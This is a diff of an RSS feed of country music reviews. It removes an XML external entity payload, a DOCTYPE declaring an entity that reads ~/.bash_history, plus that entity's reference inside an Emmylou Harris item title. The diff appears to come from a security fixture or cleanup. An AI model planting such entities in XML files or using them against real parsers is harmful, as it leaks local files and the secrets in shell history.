@@ -1,6 +1,4 @@
 <?xml version="1.0"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file://~/.bash_history" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
 <channel>
 	<title>Latest Country Reviews</title>
@@ -12,7 +10,7 @@
 	<language>en-en</language>
 	<ttl>60</ttl>
 	<item>
-		<title>Emmylou Harris - &xxe; Old Yellow Moon </title>
+		<title>Emmylou Harris - Old Yellow Moon </title>
 		<description>Smiles and tears from country friends reunited.</description>
 		<link>http://www.bbc.co.uk/music/reviews/3wgw</link>
 		<guid>http://www.bbc.co.uk/music/reviews/3wgw</guid>
